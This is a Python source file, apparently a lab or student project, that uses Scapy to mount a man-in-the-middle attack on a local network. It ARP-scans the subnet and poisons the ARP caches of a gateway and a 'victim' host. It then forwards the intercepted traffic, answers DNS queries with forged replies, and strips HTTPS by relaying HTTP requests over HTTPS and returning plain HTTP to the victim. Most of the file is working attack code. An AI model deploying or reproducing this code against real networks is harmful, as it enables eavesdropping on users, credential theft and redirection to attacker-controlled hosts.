from scapy.all import *
from scapy.layers.http import *
from scapy.layers.tls import *
from scapy.all import ARP, Ether, srp, sr1, DNS, IP, UDP, sr, DNSRR, load_layer
import psutil
import http
from http.client import HTTPSConnection
from dns.resolver import Resolver
from util import get_prefix_length, apply_mask, AddressFamily


# TODO: if time -> try to fix
# Response time increases because of the current implementation for packet forwarding 
# results in some replies being timed out. (loss of packets)
# alernative: command packet forwarding -> os dependent (disadvantage)

load_layer('http')

dns_server = '8.8.8.8'

DNS_MAX_RETRIES = 3
DNS_TIMEOUT = 2



# We don't want to enable promiscuous mode because we don't care 
# about the network traffic. Also, not all interfaces might have a
# promiscuous mode. Disabling this prevents the use of promiscuous
# mode and as a result the code will work on all interfaces.
conf.sniff_promisc = 0

def scan_hosts(subnet):
    """Scans the subnet (in cidr notation) and returns a list of hosts
    """
    packet = Ether() / ARP()
    packet[ARP].pdst = subnet
    packet[Ether].dst = 'ff:ff:ff:ff:ff:ff'

    answered_requests, unanswered_requests = srp(packet, timeout=10, verbose=0)
    hosts = [{
        'ip_address': response.psrc,
        'mac_address': response.hwsrc
    } for request, response in answered_requests]

    return hosts

def get_interfaces():
    """Returns a dictionary of the interfaces
    """
    interfaces = psutil.net_if_addrs()
    interfaces_data = {}

    # Iterate over the interfaces
    for name, addresses in interfaces.items():
        interface_data = { 'name': name }

        # Loop over the addresses of the different OSI layers
        # (we are only interested in the link and network layers)
        for address in addresses:
            if address.family == AddressFamily.AF_LINK:
                interface_data['mac_address'] = address.address
            elif address.family == AddressFamily.AF_INET:
                network_ip = apply_mask(address.address, address.netmask)
                prefix_length = get_prefix_length(address.netmask)

                interface_data['ip_address'] = address.address
                interface_data['netmask'] = address.netmask
                interface_data['subnet'] = f'{network_ip}/{prefix_length}'

        interfaces_data[name] = interface_data

    return interfaces_data

def poison_arp_cache(interface_name, attacker, target1, target2):
    # send ARP reply to target 1
    # send ARP reply to target 2
    ping = IP() / ICMP()
    ping[IP].src = target2['ip_address']
    ping[IP].dst = target1['ip_address']
    sr(ping, iface=interface_name, timeout=1)

    ping = IP() / ICMP()
    ping[IP].src = target1['ip_address']
    ping[IP].dst = target2['ip_address']
    sr(ping, iface=interface_name, timeout=1)
    
    # Send mac of attacker to target 1
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target1['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target2['ip_address']
    packet[ARP].hwdst = target1['mac_address']
    packet[ARP].pdst = target1['ip_address']

    # packet.show()

    sendp(packet, iface=interface_name, verbose=0)

    # Send mac of attacker to target 2
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target2['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target1['ip_address']
    packet[ARP].hwdst = target2['mac_address']
    packet[ARP].pdst = target2['ip_address']

    # packet.show()
    sendp(packet, iface=interface_name, verbose=0)

    # repeat ARP replies every X seconds

# TODO: replace hardcoded values with variables
def make_dns_request(dns_packet):
    request = IP() / UDP() / dns_packet

    # TODO: add Ether layer to point to gateway

    request[IP].src = '10.0.2.6'
    request[IP].dst = '8.8.8.8'
    request[UDP].dport = 53

    for _ in range(DNS_MAX_RETRIES):
        response = sr1(request, verbose=0, timeout=DNS_TIMEOUT)
        if response is not None:
            return response

    return None

dns_records = {
    # 'google.com': '10.0.2.6',
    # 'www.google.com': '10.0.2.6'
}

def make_https_request(http_layer):
    host = http_layer.Host.decode('utf-8')
    method = http_layer.Method.decode('utf-8')
    path = http_layer.Path.decode('utf-8')

    connection = HTTPSConnection(host)
    connection.request(method, path)
    
    response = connection.getresponse()
    data = response.read().decode('utf-8')
    headers = response.getheaders()

    return headers, data

def process(packet):
    # SSL strip

    if packet.haslayer(HTTPRequest):
        '''
        1) Do not forward http request
        2) send an https request from attacker to server/website
        3) send response back to victim in http
        '''
        print('Packet has HTTP Request layer')
        packet.show()
        http_layer = packet[HTTPRequest]
        headers, data = make_https_request(http_layer)
        # Convert list of tuples to a dictionary, replacing spaces with underscores
        headers = { header.replace(' ', '_').replace('-', '_'): value for header, value in headers }

        response = HTTPResponse(**headers)
        response.add_payload(data)

        reply = IP() / TCP() / HTTP() / response
        reply[IP].src = gateway['ip_address']
        reply[IP].dst = victim['ip_address']
        reply[TCP].sport = packet[TCP].dport
        reply[TCP].dport = packet[TCP].sport
        reply[TCP].flags = "A"
        reply[TCP].ack = packet[TCP].seq
        reply[TCP].seq = packet[TCP].ack

        send(reply)


        return

    #  packet forwarding
    if packet.haslayer(Ether) and packet[Ether].src == gateway['mac_address']:
        packet[Ether].dst = victim['mac_address']
        # packet.show()
        sendp(packet, verbose=0)
        return

    elif packet[Ether].src == victim['mac_address']:

        if packet.haslayer(DNS):
            dns = packet[DNS]
            # standard record query
            if dns.qr == 0 and dns.opcode == 0:
                queried_host = dns.qd.qname[:-1].decode()

                if queried_host in dns_records:
                    resolved_ip = dns_records[queried_host]

                    dns_answer = DNSRR(rrname=queried_host + '.', ttl=330, type='A', rclass='IN', rdata=resolved_ip)

                    dns_reply = IP() / UDP() / DNS()
                    dns_reply[IP].src = packet[IP].dst
                    dns_reply[IP].dst = packet[IP].src
                    dns_reply[UDP].sport = packet[UDP].dport
                    dns_reply[UDP].dport = packet[UDP].sport
                    dns_reply[DNS].id = dns.id
                    dns_reply[DNS].qr = 1
                    dns_reply[DNS].aa = 0
                    dns_reply[DNS].qd = dns.qd
                    dns_reply[DNS].an = dns_answer

                    # print('Replying with poison')

                    send(dns_reply, verbose=0)
                else:
                    dns_layer_answer = make_dns_request(dns)
                    if dns_layer_answer is None:
                        print('Failed to get DNS response, ignoring request')
                        # do nothing, request failed
                        return

                    dns_reply = IP() / UDP() / dns_layer_answer[DNS]
                    dns_reply[IP].src = packet[IP].dst
                    dns_reply[IP].dst = packet[IP].src
                    dns_reply[UDP].sport = packet[UDP].dport
                    dns_reply[UDP].dport = packet[UDP].sport

                    # print('Replying with DNS response')
                    # dns_reply.show()

                    send(dns_reply, verbose=0)

                return

        packet[Ether].dst = gateway['mac_address']
        # packet.show()
        sendp(packet, verbose=0)
        return
    

    return
    if not packet.haslayer(DNS):
        return
    
    if not packet[DNS].opcode != 1:
        return

    # Check if the DNS request is addressed to us
    if packet[Ether].dst == mac_address:
        print('Addressed to us')
    else:
        print('Not addressed to us')
        return

    print('Original packet')
    packet.show()
    print('\n\n')

    dns_response  = make_dns_request(packet[DNS])

    if dns_response is None:
        return

    print('Got dns response:')
    dns_response.show()

    response = IP() / UDP() / dns_response[DNS]
    response[IP].src = '10.0.2.6'
    response[IP].dst = packet[IP].src
    response[UDP].sport = packet[UDP].dport
    response[UDP].dport = packet[UDP].sport

    response.show()
    send(response, verbose=0)
    print('response sent')


def dns_spoofing():
    # DNS is usually on port 53
    sniff(filter='', store=0, prn=process)


interfaces = get_interfaces()
interface = interfaces['enp0s8']
mac_address = interface['mac_address']

print(f'Interface: {interface}')

hosts = scan_hosts(interface['subnet'])
print(hosts)

gateway = hosts[0]
victim = hosts[3]
attacker = {'mac_address': '08:00:27:0b:33:f8'}

poison_arp_cache(interface["name"], attacker, gateway, victim)
dns_spoofing()
